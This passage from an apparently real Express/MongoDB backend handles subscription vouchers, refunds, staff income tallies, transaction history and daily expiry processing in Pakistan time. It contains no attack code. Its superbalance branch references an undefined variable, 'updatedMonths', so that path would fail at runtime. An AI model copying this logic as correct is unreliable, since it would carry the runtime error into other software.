        return dateA.getTime() - dateB.getTime(); // Ascending: earliest first
      });

      console.log(`📅 Months sorted by date (FIFO order):`, sortedMonths.map(m => `${m.month} (${m.date || m.createdAt})`).join(', '));

      // Check if user already has a voucher
      const existingVoucher = await vouchersCollection.findOne({ userId });

      if (existingVoucher) {
        // SMART MERGE: Combine existing months with new/incoming months
        // CRITICAL FIX: Do NOT overwrite existing packageFee/discount with new user settings
        // This prevents the bug where old months (e.g. Dec 200) get overwritten by new rates (e.g. Jan 1200)

        let mergedMonths = [...(existingVoucher.months || [])];
        let hasChanges = false;

        for (const incoming of sortedMonths) {
          const existingIndex = mergedMonths.findIndex(m => m.month === incoming.month);

          if (existingIndex >= 0) {
            // Month exists - Update payment/status but PRESERVE package details
            const existing = mergedMonths[existingIndex];

            const fee = Number(existing.packageFee || 0);
            const disc = Number(existing.discount || 0);
            const paid = Number(incoming.paidAmount !== undefined ? incoming.paidAmount : (existing.paidAmount || 0));
            const remaining = Math.max(0, fee - disc - paid);

            mergedMonths[existingIndex] = {
              ...existing,
              packageFee: fee,
              discount: disc,
              paidAmount: paid,
              remainingAmount: remaining,
              status: incoming.status || existing.status,
              paymentMethod: paid > 0 ? (incoming.paymentMethod || existing.paymentMethod) : existing.paymentMethod,
              receivedBy: paid > 0 ? (incoming.receivedBy || existing.receivedBy) : existing.receivedBy,
              paymentHistory: incoming.paymentHistory || existing.paymentHistory,
              description: incoming.description || existing.description,
              date: existing.date || incoming.date,
              updatedAt: new Date()
            };
            hasChanges = true;
          } else {
            // New month - add it with calculation
            const fee = Number(incoming.packageFee || 0);
            const disc = Number(incoming.discount || 0);
            const paid = Number(incoming.paidAmount || 0);
            const remaining = Math.max(0, fee - disc - paid);

            mergedMonths.push({
              ...incoming,
              packageFee: fee,
              discount: disc,
              paidAmount: paid,
              remainingAmount: remaining,
              createdAt: incoming.createdAt || new Date()
            });
            hasChanges = true;
          }
        }

        // Check if any months being paid have reversed status
        const refundsCollection = db.collection('refunds');
        const reversedMonthsPaid = mergedMonths.filter(m => {
          // Find if this month was previously reversed
          const existingMonth = existingVoucher.months?.find(em => em.month === m.month);
          return existingMonth && existingMonth.status === 'reversed' && m.status === 'paid';
        });

        // If reversed months are being paid, delete from refunds collection
        if (reversedMonthsPaid.length > 0) {
          console.log(`🔄 Marking ${reversedMonthsPaid.length} reversed months as paid`);
          for (const month of reversedMonthsPaid) {
            await refundsCollection.updateMany(
              { userId, 'refundedMonths.month': month.month },
              { $pull: { refundedMonths: { month: month.month } } }
            );
          }
          await refundsCollection.deleteMany({ userId, refundedMonths: { $size: 0 } });
        }

        // CRITICAL: Convert 'superbalance' months to 'unpaid'
        let hasSuperBalanceConverted = false;
        const validMonths = mergedMonths.map(month => {
          if (month.status === 'superbalance') {
            console.log(`⚡ Converting superbalance month '${month.month}' to unpaid`);
            hasSuperBalanceConverted = true;
            return {
              ...month,
              status: 'unpaid',
              paidAmount: 0,
              remainingAmount: month.packageFee - (month.discount || 0),
              paymentHistory: []
            };
          }
          return month;
        });

        // Sort final list
        const finalSortedMonths = validMonths.sort((a, b) => {
          const dateA = parseDate(a.date || a.createdAt);
          const dateB = parseDate(b.date || b.createdAt);
          return dateA.getTime() - dateB.getTime();
        });

        // Update existing voucher with new months array
        const result = await vouchersCollection.updateOne(
          { userId },
          {
            $set: {
              months: finalSortedMonths,
              rechargeDate: rechargeDate || existingVoucher.rechargeDate,
              expiryDate: expiryDate || existingVoucher.expiryDate,
              updatedAt: new Date()
            }
          }
        );

        // CRITICAL: If superbalance months were converted, update user status to 'unpaid'
        if (hasSuperBalanceConverted) {
          const usersCollection = db.collection('users');
          const totalRemaining = updatedMonths.reduce((sum, m) => sum + (m.remainingAmount || 0), 0);
          await usersCollection.updateOne(
            { _id: new ObjectId(userId) },
            {
              $set: {
                status: 'unpaid',
                remainingAmount: totalRemaining
              }
            }
          );
          console.log(`✅ User status updated from 'superbalance' to 'unpaid' (remaining: Rs ${totalRemaining})`);
        }

        // 💰 UPDATE INCOME: Process payments and update receiver's income (ONLY cashIncome)
        for (const month of sortedMonths) {
          if (month.status === 'paid' || month.status === 'partial') {
            // Check if month has paymentHistory (new structure) or receivedBy (old structure)
            const paymentHistory = month.paymentHistory || [];

            if (paymentHistory.length > 0) {
              // New structure: Process each payment in history
              for (const payment of paymentHistory) {
                const receiver = payment.receivedBy || 'Admin';
                const amount = parseFloat(payment.amount) || 0;

                if (amount > 0) {
                  await incomesCollection.updateOne(
                    { name: receiver },
                    {
                      $inc: { cashIncome: amount },
                      $set: { lastUpdated: new Date() },
                      $setOnInsert: { name: receiver, createdAt: new Date() }
                    },
                    { upsert: true }
                  );
                  console.log(`💰 Income updated: ${receiver} +Rs${amount}`);
                }
              }
            } else if (month.receivedBy) {
              // Old structure: Single receivedBy field
              const receiver = month.receivedBy;
              const amount = parseFloat(month.paidAmount) || 0;

              if (amount > 0) {
                await incomesCollection.updateOne(
                  { name: receiver },
                  {
                    $inc: { cashIncome: amount },
                    $set: { lastUpdated: new Date() },
                    $setOnInsert: { name: receiver, createdAt: new Date() }
                  },
                  { upsert: true }
                );
                console.log(`💰 Income updated: ${receiver} +Rs${amount}`);
              }
            }
          }
        }

        return res.status(200).json({
          success: true,
          message: 'Voucher updated with months array',
          data: { _id: existingVoucher._id }
        });
      } else {
        // Create new voucher with months array (in FIFO order)
        const newVoucher = {
          userId,
          userName,
          rechargeDate: rechargeDate || null,
          expiryDate: expiryDate || null,
          months: sortedMonths,
          createdAt: new Date()
        };

        const result = await vouchersCollection.insertOne(newVoucher);

        // 💰 UPDATE INCOME: Process payments and update receiver's income (ONLY cashIncome)
        for (const month of sortedMonths) {
          if (month.status === 'paid' || month.status === 'partial') {
            // Check if month has paymentHistory (new structure) or receivedBy (old structure)
            const paymentHistory = month.paymentHistory || [];

            if (paymentHistory.length > 0) {
              // New structure: Process each payment in history
              for (const payment of paymentHistory) {
                const receiver = payment.receivedBy || 'Admin';
                const amount = parseFloat(payment.amount) || 0;

                if (amount > 0) {
                  await incomesCollection.updateOne(
                    { name: receiver },
                    {
                      $inc: { cashIncome: amount },
                      $set: { lastUpdated: new Date() },
                      $setOnInsert: { name: receiver, createdAt: new Date() }
                    },
                    { upsert: true }
                  );
                  console.log(`💰 Income updated: ${receiver} +Rs${amount}`);
                }
              }
            } else if (month.receivedBy) {
              // Old structure: Single receivedBy field
              const receiver = month.receivedBy;
              const amount = parseFloat(month.paidAmount) || 0;

              if (amount > 0) {
                await incomesCollection.updateOne(
                  { name: receiver },
                  {
                    $inc: { cashIncome: amount },
                    $set: { lastUpdated: new Date() },
                    $setOnInsert: { name: receiver, createdAt: new Date() }
                  },
                  { upsert: true }
                );
                console.log(`💰 Income updated: ${receiver} +Rs${amount}`);
              }
            }
          }
        }

        return res.status(201).json({
          success: true,
          message: 'Voucher created with months array',
          data: { _id: result.insertedId, ...newVoucher }
        });
      }
    }

    // EXISTING: Individual month creation logic (for backward compatibility)

    // Required validation
    if (!userId || !userName || packageFee === undefined || !month) {
      return res.status(400).json({
        success: false,
        message: 'Missing required fields: userId, userName, packageFee, month'
      });
    }

    // Voucher data for this month
    const monthData = {
      month,
      packageFee: parseFloat(packageFee),
      discount: parseFloat(discount) || 0,
      paidAmount: parseFloat(paidAmount) || 0,
      remainingAmount: parseFloat(remainingAmount) || 0,
      paymentMethod: paymentMethod || 'Not Paid',
      receivedBy: receivedBy || 'Myself',
      paymentType: paymentType || 'later',
      status: status || 'unpaid',
      description: description || `${month} - ${status === 'paid' ? 'Paid' : 'Pending'}`,
      date: date ? new Date(date) : new Date(),
      createdAt: new Date()
    };

    // Check if user already has a voucher document
    const existingVoucher = await vouchersCollection.findOne({ userId });

    if (existingVoucher) {
      // Check if the same month already exists
      const monthExists = existingVoucher.months?.some(
        (m) => m.month === month
      );

      if (monthExists) {
        return res.status(400).json({
          success: false,
          message: `Voucher for ${month} already exists for this user.`
        });
      }

      // Add new month to existing document and update dates if provided
      const updateFields = { $push: { months: monthData } };
      if (rechargeDate || expiryDate) {
        updateFields.$set = {};
        if (rechargeDate) updateFields.$set.rechargeDate = rechargeDate;
        if (expiryDate) updateFields.$set.expiryDate = expiryDate;
      }

      await vouchersCollection.updateOne(
        { userId },
        updateFields
      );

      res.status(200).json({
        success: true,
        message: `New month (${month}) added to existing voucher.`,
        data: monthData
      });
    } else {
      // Create new voucher document for the user with months array
      const newVoucher = {
        userId,
        userName,
        rechargeDate: rechargeDate || null,
        expiryDate: expiryDate || null,
        months: [monthData],
        createdAt: new Date()
      };

      const result = await vouchersCollection.insertOne(newVoucher);

      res.status(201).json({
        success: true,
        message: 'New voucher document created for user.',
        data: { _id: result.insertedId, ...newVoucher }
      });
    }
  } catch (error) {
    console.error('Error creating voucher:', error);
    res.status(500).json({
      success: false,
      message: 'Error creating voucher',
      error: error.message
    });
  }
});

// PUT update voucher by ID (update months array and optional dates)
app.put('/api/vouchers/:id', ensureDbConnection, async (req, res) => {
  try {
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({ success: false, message: 'Invalid voucher ID format' });
    }

    const vouchersCollection = db.collection('vouchers');
    const updateData = req.body;
    const { months, rechargeDate, expiryDate, isRefund, mode } = updateData;
    const updateFields = {};

    // 1. HANDLE REFUNDS (Reversals)
    if (months && Array.isArray(months) && isRefund) {
      console.log('🔄 REFUND DETECTED');
      const voucher = await vouchersCollection.findOne({ _id: new ObjectId(req.params.id) });
      if (voucher) {
        const usersCollection = db.collection('users');
        const user = await usersCollection.findOne({ _id: new ObjectId(voucher.userId) });
        const reversedMonths = months.filter(m => m.status === 'reversed');

        if (reversedMonths.length > 0) {
          const refundsCollection = db.collection('refunds');
          const refundRecord = {
            userId: voucher.userId,
            voucherId: voucher._id.toString(),
            userName: user?.userName || 'Unknown',
            packageName: user?.packageName || 'Unknown',
            refundedMonths: reversedMonths.map(m => ({
              month: m.month,
              packageFee: Number(m.packageFee || 0),
              discount: Number(m.discount || 0),
              refundedAmount: Number(m.refundedAmount || m.paidAmount || 0),
              remainingAmount: Number(m.remainingAmount || 0),
              refundDate: m.refundDate || new Date().toISOString()
            })),
            status: 'reversed',
            createdAt: new Date(),
            totalRefundedAmount: reversedMonths.reduce((sum, m) => sum + Number(m.refundedAmount || m.paidAmount || 0), 0)
          };
          await refundsCollection.insertOne(refundRecord);

          if (months.every(m => m.status === 'reversed')) {
            await usersCollection.updateOne({ _id: new ObjectId(voucher.userId) }, { $set: { status: 'reversed' } });
          }
        }
      }
    }

    if (Array.isArray(months)) {
      if (mode === 'replace') {
        // DELETE/RESET MODE: specific for removing months
        updateFields.months = months.sort((a, b) => {
          const dA = a.date ? new Date(a.date) : new Date(0);
          const dB = b.date ? new Date(b.date) : new Date(0);
          return dA.getTime() - dB.getTime();
        });
        console.log(`🗑️ Backend PUT: REPLACED months array with ${months.length} items`);
      } else {
        // Fetch existing voucher to perform smart merge
        const existingVoucher = await vouchersCollection.findOne({ _id: new ObjectId(req.params.id) });

        if (!existingVoucher) {
          return res.status(404).json({ success: false, message: 'Voucher not found' });
        }

        // CRITICAL: Sort incoming months by date (FIFO - First In First Out)
        const parseDate = (dateStr) => {
          if (!dateStr) return new Date(0);
          if (dateStr instanceof Date) return dateStr;
          if (typeof dateStr === 'string') {
            if (/^\d{4}-\d{2}-\d{2}/.test(dateStr)) {
              const parsed = new Date(dateStr);
              if (!isNaN(parsed.getTime())) return parsed;
            }
            const parts = dateStr.split(/[-\/]/);
            if (parts.length === 3 && parts[2].length === 4) {
              const day = parseInt(parts[0], 10);
              const month = parseInt(parts[1], 10) - 1;
              const year = parseInt(parts[2], 10);
              if (!isNaN(day) && !isNaN(month) && !isNaN(year)) {
                return new Date(year, month, day);
              }
            }
            const parsed = new Date(dateStr);
            return isNaN(parsed.getTime()) ? new Date(0) : parsed;
          }
          return new Date(0);
        };

        const sortedIncoming = [...months].sort((a, b) => {
          const dateA = parseDate(a.date || a.createdAt);
          const dateB = parseDate(b.date || b.createdAt);
          return dateA.getTime() - dateB.getTime();
        });

        // SMART MERGE & RECALCULATION
        const mergedMonths = [...(existingVoucher.months || [])];

        for (const incoming of sortedIncoming) {
          const existingIndex = mergedMonths.findIndex(m => m.month === incoming.month);

          if (existingIndex >= 0) {
            // UPDATE EXISTING MONTH
            const existing = mergedMonths[existingIndex];

            // PRESERVE: packageFee and discount from database (source of truth)
            const fee = Number(existing.packageFee || 0);
            const disc = Number(existing.discount || 0);

            // UPDATE: payment info from incoming
            const paid = Number(incoming.paidAmount !== undefined ? incoming.paidAmount : (existing.paidAmount || 0));

            // RECALCULATE: Forced consistency check (mathematical truth)
            const remaining = Math.max(0, fee - disc - paid);

            mergedMonths[existingIndex] = {
              ...existing,
              packageFee: fee,
              discount: disc,
              paidAmount: paid,
              remainingAmount: remaining,
              status: incoming.status || existing.status,
              paymentMethod: paid > 0 ? (incoming.paymentMethod || existing.paymentMethod) : existing.paymentMethod,
              receivedBy: paid > 0 ? (incoming.receivedBy || existing.receivedBy) : existing.receivedBy,
              paymentHistory: incoming.paymentHistory || existing.paymentHistory,
              description: incoming.description || existing.description,
              date: existing.date || incoming.date,
              updatedAt: new Date()
            };
          } else {
            // ADD NEW MONTH
            const fee = Number(incoming.packageFee || 0);
            const disc = Number(incoming.discount || 0);
            const paid = Number(incoming.paidAmount || 0);
            const remaining = Math.max(0, fee - disc - paid);

            mergedMonths.push({
              ...incoming,
              packageFee: fee,
              discount: disc,
              paidAmount: paid,
              remainingAmount: remaining,
              createdAt: incoming.createdAt || new Date()
            });
          }
        }

        // Final sort
        updateFields.months = mergedMonths.sort((a, b) => {
          const dateA = parseDate(a.date || a.createdAt);
          const dateB = parseDate(b.date || b.createdAt);
          return dateA.getTime() - dateB.getTime();
        });

        console.log(`📅 Backend PUT: Smart merged ${mergedMonths.length} months for voucher ${req.params.id}`);
      }
    }

    if (rechargeDate !== undefined) updateFields.rechargeDate = rechargeDate || null;
    if (expiryDate !== undefined) updateFields.expiryDate = expiryDate || null;
    updateFields.updatedAt = new Date();

    const result = await vouchersCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: updateFields }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Voucher not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Voucher updated successfully'
    });
  } catch (error) {
    console.error('Error updating voucher:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating voucher',
      error: error.message
    });
  }
});

// GET user transaction history
app.get('/api/users/:id/transactions', async (req, res) => {
  try {


    const user = await usersCollection.findOne({ _id: new ObjectId(req.params.id) });
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    // Get all vouchers for this user
    const vouchersCollection = db.collection('vouchers');
    const vouchers = await vouchersCollection.find({
      userId: req.params.id
    }).sort({ date: 1 }).toArray(); // Sort by 'date' field instead of 'createdAt'

    // Build transaction history
    const transactions = [];
    let runningBalance = 0;

    vouchers.forEach(voucher => {
      // Use voucher.date if available, fallback to createdAt
      const voucherDate = voucher.date ? new Date(voucher.date) : new Date(voucher.createdAt);
      const monthYear = voucherDate.toLocaleDateString('en-GB', { day: 'numeric', month: 'short' });

      // Calculate actual pending amount (packageFee - discount - paidAmount)
      const packageFee = Number(voucher.packageFee || 0);
      const discount = Number(voucher.discount || 0);
      const paidAmount = Number(voucher.paidAmount || 0);
      const remainingAmount = Number(voucher.remainingAmount || 0);

      // If remainingAmount is set, use it (for Pay Later vouchers)
      // Otherwise calculate: packageFee - discount
      const actualFee = remainingAmount > 0 ? remainingAmount + paidAmount : packageFee - discount;

      // Add package fee as debit (after discount)
      runningBalance -= actualFee;
      transactions.push({
        date: monthYear,
        description: voucher.month || `${voucherDate.toLocaleDateString('en-GB', { month: 'long' })} Fee`,
        debit: actualFee,
        credit: null,
        balance: runningBalance
      });

      // Add payment as credit (if paid)
      if (paidAmount > 0) {
        runningBalance += paidAmount;
        transactions.push({
          date: monthYear,
          description: 'Payment Received',
          debit: null,
          credit: paidAmount,
          balance: runningBalance
        });
      }
    });

    res.status(200).json({
      success: true,
      data: {
        user: {
          _id: user._id,
          userName: user.userName,
          status: user.status
        },
        transactions: transactions,
        currentBalance: runningBalance
      }
    });
  } catch (error) {
    console.error('Error fetching transactions:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching transactions',
      error: error.message
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Something went wrong!',
    error: err.message
  });
});

// ============ SCHEDULED TASKS ============

// Function to check users expiring TOMORROW (next day) - marks them to show in expiring-soon tab
const checkTomorrowExpiringUsers = async () => {
  try {
    console.log('🕐 Running scheduled task: Checking users expiring TOMORROW...');

    // Use PKT timezone
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
    const todayY = nowInPKT.getUTCFullYear();
    const todayM = nowInPKT.getUTCMonth();
    const todayD = nowInPKT.getUTCDate();
    const currentHour = nowInPKT.getUTCHours();

    // CRITICAL: Only process if current time is at or after 12 PM (noon)
    // This prevents premature marking at midnight (12 AM)
    if (currentHour < 12) {
      console.log(`⏰ Current time is ${currentHour}:00 (before 12 PM) - Skipping expiring soon check`);
      console.log(`   Expiring soon check should only run at or after 12 PM (noon)`);
      return;
    }

    console.log(`✅ Current time is ${currentHour}:00 (at or after 12 PM) - Proceeding with expiring soon check`);

    // Calculate tomorrow's date in PKT
    const tomorrowDate = new Date(Date.UTC(todayY, todayM, todayD + 1));
    const tomorrowY = tomorrowDate.getUTCFullYear();
    const tomorrowM = tomorrowDate.getUTCMonth();
    const tomorrowD = tomorrowDate.getUTCDate();

    console.log(`📅 Today: ${todayY}-${todayM + 1}-${todayD}, Tomorrow: ${tomorrowY}-${tomorrowM + 1}-${tomorrowD}`);

    // Fetch ALL users and parse their expiry dates
    const usersAll = await usersCollection.find({
      status: { $in: ['paid', 'partial', 'unpaid', 'pending', 'superbalance'] },
      $or: [
        { serviceStatus: { $ne: 'inactive' } },
        { serviceStatus: { $exists: false } }
      ]
    }).toArray();

    const toPKT_YMD = (dateObj) => {
      const pkt = new Date(dateObj.getTime() + PKT_OFFSET_MIN * 60000);
      return { y: pkt.getUTCFullYear(), m: pkt.getUTCMonth(), d: pkt.getUTCDate() };
    };

    const parseExpiryYMD = (exp) => {
      if (!exp) return null;
      if (exp instanceof Date) return toPKT_YMD(exp);
      if (typeof exp === 'string') {
        const m1 = exp.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})$/); // DD-MM-YYYY or DD/MM/YYYY
        if (m1) {
          const d = parseInt(m1[1], 10);
          const m = parseInt(m1[2], 10) - 1;
          const y = parseInt(m1[3], 10);
          return toPKT_YMD(new Date(Date.UTC(y, m, d)));
        }
        const m2 = exp.match(/^(\d{4})-(\d{2})-(\d{2})/); // ISO-like
        if (m2) {
          const y = parseInt(m2[1], 10);
          const m = parseInt(m2[2], 10) - 1;
          const d = parseInt(m2[3], 10);
          return toPKT_YMD(new Date(Date.UTC(y, m, d)));
        }
        const d2 = new Date(exp);
        if (!isNaN(d2.getTime())) return toPKT_YMD(d2);
        return null;
      }
      return null;
    };

    // Find users expiring TOMORROW
    const expiringTomorrowUsers = usersAll
      .map(u => ({ u, ymd: parseExpiryYMD(u.expiryDate) }))
      .filter(({ ymd }) => ymd && ymd.y === tomorrowY && ymd.m === tomorrowM && ymd.d === tomorrowD)
      .map(({ u }) => u);

    console.log(`✅ Found ${expiringTomorrowUsers.length} users expiring TOMORROW`);

    if (expiringTomorrowUsers.length > 0) {
      // Just mark users to show in Expiring Soon (don't change status or create voucher yet)
      for (const user of expiringTomorrowUsers) {
        console.log(`   - Marking ${user.userName} for Expiring Soon (expires tomorrow: ${user.expiryDate})`);

        // Only set the Expiring Soon flag (status stays as paid/partial/pending)
        await usersCollection.updateOne(
          { _id: user._id },
          {
            $set: {
              showInExpiringSoon: true
            }
          }
        );

        console.log(`   ✅ ${user.userName} will show in Expiring Soon (status unchanged)`);
      }
    }

  } catch (error) {
    console.error('❌ Error in checkTomorrowExpiringUsers:', error);
  }
};

// Function to check and update expiring users (7 days)
const checkExpiringUsers = async () => {
  try {
    console.log('🕐 Running scheduled task: Checking expiring users...');

    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const sevenDaysFromNow = new Date(today);
    sevenDaysFromNow.setDate(sevenDaysFromNow.getDate() + 7);
    sevenDaysFromNow.setHours(23, 59, 59, 999);

    // Find users who are paid/partial and expiring within 7 days
    const expiringUsers = await usersCollection.find({
      status: { $in: ['paid', 'partial'] },
      expiryDate: {
        $gte: today.toISOString(),
        $lte: sevenDaysFromNow.toISOString()
      }
    }).toArray();

    console.log(`✅ Found ${expiringUsers.length} users expiring within 7 days`);

    // Optional: You can add a flag or notification here
    if (expiringUsers.length > 0) {
      expiringUsers.forEach(user => {
        const expiryDate = new Date(user.expiryDate);
        const daysLeft = Math.ceil((expiryDate - today) / (1000 * 60 * 60 * 24));
        console.log(`   - ${user.userName} expires in ${daysLeft} days (${user.expiryDate})`);
      });
    }

  } catch (error) {
    console.error('❌ Error in scheduled task:', error);
  }
};

// Function to move users to unpaid on their actual expiry day and create next month voucher
// ACTUAL RECURRING CYCLE FLOW:
// 1. User added: 28/10/2025 (recharge) → 28/11/2025 (expiry) → Status: PAID
// 2. On 27/11/2025 (1 day before expiry): checkTomorrowExpiringUsers() runs at 12 PM
//    - Sets showInExpiringSoon = true (ONLY THIS, no status change)
//    - User appears in "Expiring Soon" tab
//    - Status remains PAID
// 3. On 28/11/2025 (actual expiry day): moveTodayExpiredToUnpaid() runs at 12 PM
//    - Changes status: PAID → UNPAID
//    - Creates December voucher (unpaid month)
//    - Updates expiry: 28/12/2025
//    - Removes showInExpiringSoon flag
//    - User shows in "Unpaid" tab only
// 4. User pays December: Status → PAID, shows in paid-users
// 5. On 27/12/2025 (1 day before): Shows in "Expiring Soon" again
// 6. On 28/12/2025: Moves to unpaid again, creates January voucher
// 7. Cycle repeats monthly
const moveTodayExpiredToUnpaid = async () => {
  try {
    console.log('🕐 Running scheduled task: Moving TODAY/PAST expiring users to unpaid...');

    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const endOfToday = new Date(today);
    endOfToday.setHours(23, 59, 59, 999);

    // Find ALL users (paid/partial/unpaid/pending) and match expiry by PKT calendar-day equality
    // NOTE: Do not use ISO range because expiryDate is stored as string (DD-MM-YYYY or DD/MM/YYYY)
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
    const todayY = nowInPKT.getUTCFullYear();
    const todayM = nowInPKT.getUTCMonth();
    const todayD = nowInPKT.getUTCDate();
    const currentHour = nowInPKT.getUTCHours();

    // CRITICAL: Only process if current time is at or after 12 PM (noon)
    // This prevents premature processing at midnight (12 AM)
    if (currentHour < 12) {
      console.log(`⏰ Current time is ${currentHour}:00 (before 12 PM) - Skipping expiry processing`);
      console.log(`   Expiry processing should only run at or after 12 PM (noon)`);
      return;
    }

    console.log(`✅ Current time is ${currentHour}:00 (at or after 12 PM) - Proceeding with expiry processing`);

    const usersAll = await usersCollection.find({
      status: { $in: ['paid', 'partial', 'unpaid', 'pending', 'superbalance'] },
      $or: [
        { serviceStatus: { $ne: 'inactive' } },
        { serviceStatus: { $exists: false } }
      ]
    }).toArray();

    const toPKT_YMD = (dateObj) => {
      const pkt = new Date(dateObj.getTime() + PKT_OFFSET_MIN * 60000);
      return { y: pkt.getUTCFullYear(), m: pkt.getUTCMonth(), d: pkt.getUTCDate() };
    };
    const parseExpiryYMD = (exp) => {
      if (!exp) return null;
      if (exp instanceof Date) return toPKT_YMD(exp);
      if (typeof exp === 'string') {
        const m1 = exp.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})$/); // DD-MM-YYYY or DD/MM/YYYY
        if (m1) {
          const d = parseInt(m1[1], 10);
          const m = parseInt(m1[2], 10) - 1;
          const y = parseInt(m1[3], 10);
          return toPKT_YMD(new Date(Date.UTC(y, m, d)));
        }
        const m2 = exp.match(/^(\d{4})-(\d{2})-(\d{2})/); // ISO-like
        if (m2) {
          const y = parseInt(m2[1], 10);
          const m = parseInt(m2[2], 10) - 1;
          const d = parseInt(m2[3], 10);
          return toPKT_YMD(new Date(Date.UTC(y, m, d)));
        }
        const d2 = new Date(exp);
        if (!isNaN(d2.getTime())) return toPKT_YMD(d2);
        return null;
      }
      return null;
    };

    // Filter users whose expiry is TODAY or PAST (handles missed processing)
    const isDateLTE = (ymd, refY, refM, refD) => {
      if (ymd.y < refY) return true;
      if (ymd.y === refY && ymd.m < refM) return true;
      if (ymd.y === refY && ymd.m === refM && ymd.d <= refD) return true;
      return false;
    };

    const expiredUsers = usersAll
      .map(u => ({ u, ymd: parseExpiryYMD(u.expiryDate) }))
      .filter(({ ymd }) => ymd && isDateLTE(ymd, todayY, todayM, todayD))
      .map(({ u }) => u);

    console.log(`✅ Found ${expiredUsers.length} users with expiry TODAY (will move to Unpaid)`);

    if (expiredUsers.length > 0) {
      // Create voucher, change status to unpaid, and remove from Expiring Soon
      for (const user of expiredUsers) {
        console.log(`   - Processing ${user.userName} (expiry date reached: ${user.expiryDate})`);

        // Parse expiry date (DD-MM-YYYY or DD/MM/YYYY)
        const parseDate = (dateStr) => {
          if (!dateStr) return new Date();
          const m1 = dateStr.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})$/);
          if (m1) return new Date(parseInt(m1[3], 10), parseInt(m1[2], 10) - 1, parseInt(m1[1], 10));
          return new Date(dateStr);
        };

        const currentExpiryDate = parseDate(user.expiryDate);

        // CRITICAL: Voucher should be for the CURRENT expiry month, not next month
        // Example: If expiry is 20 Nov, voucher should be for November (current expiry month)
        // The next expiry date is only for updating user's expiry date for next cycle
        const monthName = currentExpiryDate.toLocaleDateString('en-US', { month: 'long', year: 'numeric' });

        // Calculate next month's expiry date (for updating user's expiry date)
        const nextExpiryDate = new Date(currentExpiryDate);
        nextExpiryDate.setMonth(nextExpiryDate.getMonth() + 1);

        // Format dates as DD-MM-YYYY
        const formatDate = (date) => {
          const dd = String(date.getDate()).padStart(2, '0');
          const mm = String(date.getMonth() + 1).padStart(2, '0');
          const yyyy = date.getFullYear();
          return `${dd}-${mm}-${yyyy}`;
        };

        const newExpiryDateStr = formatDate(nextExpiryDate);

        console.log(`   → Creating voucher for current expiry month: ${monthName}`);
        console.log(`   → New expiry date for next cycle: ${newExpiryDateStr}`);

        // Update user: change to unpaid, update expiry date, remove from Expiring Soon
        await usersCollection.updateOne(
          { _id: user._id },
          {
            $set: {
              status: 'unpaid',
              expiryDate: newExpiryDateStr,
              showInExpiringSoon: false,
              unpaidSince: new Date()
            }
          }
        );

        // Find or create voucher for this user
        let userVoucher = await vouchersCollection.findOne({ userId: user._id.toString() });

        const packageFeePerMonth = Number(user.amount || 0);
        const discountPerMonth = Number(user.discount || 0);
        const remainingAfterDiscount = Math.max(0, packageFeePerMonth - discountPerMonth);

        const newMonth = {
          month: monthName,
          packageFee: packageFeePerMonth,
          discount: discountPerMonth,
          paidAmount: 0,
          remainingAmount: remainingAfterDiscount,
          paymentMethod: 'Pending',
          receivedBy: '',
          paymentType: 'later',
          status: 'unpaid',
          description: `${monthName} - Pending Payment`,
          date: currentExpiryDate.toISOString(), // Use current expiry date for the month date
          createdAt: new Date()
        };

        if (userVoucher) {
          // Check if next month already exists
          const monthExists = userVoucher.months?.some(m => m.month === monthName);

          if (!monthExists) {
            // Add new unpaid month
            await vouchersCollection.updateOne(
              { userId: user._id.toString() },
              {
                $push: { months: newMonth },
                $set: {
                  expiryDate: newExpiryDateStr,
                  updatedAt: new Date()
                }
              }
            );
            console.log(`   ✅ Added ${monthName} voucher to existing record`);
          } else {
            console.log(`   ⚠️ ${monthName} voucher already exists`);
          }
        } else {
          // Create new voucher document
          const newVoucher = {
            userId: user._id.toString(),
            userName: user.userName,
            packageName: user.packageName,
            rechargeDate: user.rechargeDate,
            expiryDate: newExpiryDateStr,
            months: [newMonth],
            createdAt: new Date(),
            updatedAt: new Date()
          };

          await vouchersCollection.insertOne(newVoucher);
          console.log(`   ✅ Created new voucher with ${monthName}`);
        }

        console.log(`   ✅ ${user.userName} moved to UNPAID and removed from Expiring Soon`);
      }

      console.log(`✅ Successfully processed ${expiredUsers.length} users`);
    }

    // Check for users whose expiry date has passed (for Expired section)
    console.log('🕐 Checking for users whose expiry date has passed...');

    const expiredDate = new Date(today);
    expiredDate.setDate(expiredDate.getDate() - 1); // Yesterday or earlier

    // Find users whose expiry date has passed and are not inactive
    const pastExpiredUsers = await usersCollection.find({
      expiryDate: { $lt: today.toISOString() },
      serviceStatus: { $ne: 'inactive' }
    }).toArray();

    console.log(`✅ Found ${pastExpiredUsers.length} users with expired subscriptions`);

    // No need to update anything here as the expired users API endpoint will filter them automatically
    // This is just for logging purposes

  } catch (error) {
    console.error('❌ Error in moveTodayExpiredToUnpaid task:', error);
  }
};

// Initialize scheduled tasks (called after MongoDB connection)
const initializeScheduledTasks = () => {
  // ===== CRON DISABLED - Using External Cron Service (cron-job.org) =====
  // External cron hits these endpoints:
  // - https://techno-server-teal.vercel.app/api/admin/run-expiry-processing (12 PM daily)
  // - https://techno-server-teal.vercel.app/api/admin/run-reminders (8 PM daily)

  // IMPORTANT: Do NOT run processing on server start
  // Only external cron (cron-job.org) should trigger at scheduled times (12 PM)
  // This prevents premature expiry processing before 12 PM

  console.log('📅 Server started - Using external cron service (cron-job.org)');
  console.log('   → Expiry processing will run at 12 PM via cron-job.org');
  console.log('   → Endpoint: /api/admin/run-expiry-processing');
  console.log('   → Reminder processing endpoint: /api/admin/run-reminders');
};

